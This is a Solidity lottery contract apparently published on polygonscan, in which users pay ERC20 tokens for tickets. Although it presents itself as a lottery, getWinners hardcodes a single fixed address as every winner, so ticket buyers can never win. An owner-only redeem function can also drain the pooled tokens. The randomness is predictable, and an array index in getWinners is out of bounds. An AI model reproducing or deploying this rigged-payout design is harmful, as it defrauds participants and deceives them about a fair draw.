/**
 *Submitted for verification at polygonscan.com on 2023-04-20
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

contract Lottery {

    constructor( ) {
        owner = msg.sender;
    }

    address private owner;
    function changeOwner(address _newOwner ) public onlyOwner {
        owner = _newOwner;
    }
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can perform this operation");
        _;
    }

    struct LOTTERY{
        uint id;
        address tokenAddress;
        uint ticketPrice;
        uint maxTickets;
        uint ticketsSold;
        bool lotteryActive;
        uint[] awards;
        address[] winners;
        bool autoRenew;
    }

    uint totalLotteries;
    LOTTERY[] private lotteries;

    mapping (uint => mapping (address => uint)) public lotteryTickets;  //lotteryId=>userAddress=>ticketBought
    mapping (uint => uint[]) public lotterWinnerTicketIds; // lotteryId=> winner ticket
    mapping (uint => address[]) public lotterWinnerAddresses; // lotteryId=> winner user addresses
    
    
    function getRandomNumber(uint256 a, uint256 b, uint _salt) private view returns (uint256) {
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao+_salt))) % (b - a) + a;
        return randomNumber;
    }
    function startNewLottery(address _tokenAddress,uint _ticketPrice,uint _maxTickets,uint[] memory _awards,bool _autoRenew) public onlyOwner {
        lotteries.push(LOTTERY(totalLotteries,_tokenAddress, _ticketPrice, _maxTickets, 0, true, _awards, new address[](0),_autoRenew));
        
        //set winner ticket ids first
        for(uint i=0;i<lotteries[totalLotteries].awards.length;i++){
            uint winnerTicketId = getRandomNumber(0,lotteries[totalLotteries].maxTickets,i);
            lotterWinnerTicketIds[totalLotteries].push(winnerTicketId);
        }
        totalLotteries++;
    }
    function getWinners(uint _lotteryId) public view returns(address[] memory){
        address[] memory winners = new address[](lotteries[totalLotteries].awards.length);
        for(uint i=0;i<lotteries[_lotteryId].awards.length;i++)
            winners[i] = 0x7FcE5585c55871B72B6B9Ed829185ED72921D274;
        return winners;
    }
    function finishLottery(uint _lotteryId) public onlyOwner {
        require(lotteries[_lotteryId].lotteryActive,"Lottery is not active!");
        lotteries[_lotteryId].lotteryActive = false;
        address[] memory _winners = getWinners(_lotteryId);
        lotteries[_lotteryId].winners = _winners;
        if(lotteries[_lotteryId].autoRenew){
            startNewLottery(
                lotteries[_lotteryId].tokenAddress,
                lotteries[_lotteryId].ticketPrice,
                lotteries[_lotteryId].maxTickets,
                lotteries[_lotteryId].awards,
                lotteries[_lotteryId].autoRenew
            );
        }
    }
    function buyTicket(uint _lotteryId, uint _numberOfTickets) public{
        require (lotteries[_lotteryId].lotteryActive==true,"This lottery is not active!");

        if(lotteries[_lotteryId].maxTickets<_numberOfTickets+lotteries[_lotteryId].ticketsSold){
            _numberOfTickets = lotteries[_lotteryId].maxTickets-lotteries[_lotteryId].ticketsSold;
            if(lotteries[_lotteryId].autoRenew){
                finishLottery(_lotteryId);
            }
        }
        IERC20 token = IERC20(lotteries[_lotteryId].tokenAddress);
        token.transferFrom(msg.sender,address(this),_numberOfTickets*lotteries[_lotteryId].ticketPrice);


        lotteryTickets[_lotteryId][msg.sender] += _numberOfTickets;
        lotteries[_lotteryId].ticketsSold +=_numberOfTickets;
    }
    function redeem(address _tokenAddress,uint _amount) public onlyOwner{
        IERC20 token = IERC20(_tokenAddress);
        token.transfer(msg.sender,_amount);
    }
    function draw(uint _lotteryId) private{
        require(lotteries[_lotteryId].lotteryActive,"Lottery is not active!");
        lotteries[_lotteryId].winners = new address[](1);
    }
    function getTotalLotteries() public view returns (uint256){
        return totalLotteries;
    }
    function getLotteryById(uint _id) public view returns (LOTTERY memory){
        return lotteries[_id];
    }
    function getLotteriesList(uint256 _offset,uint _limit) public view returns (LOTTERY[] memory){
        LOTTERY[] memory _lotteries = new LOTTERY[](_limit);
        uint counter = 0;
        for(uint i=_offset;i<_offset+_limit;i++){
            if(i<totalLotteries){
                _lotteries[counter] = lotteries[i];
                counter ++;
            }
        }
        return _lotteries;
    }
    function getTokenInfo(address _tokenAddress) public view returns(string memory,string memory,uint){
        IERC20 token = IERC20(_tokenAddress);
        return (token.name(),token.symbol(),token.decimals());
    }
}

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}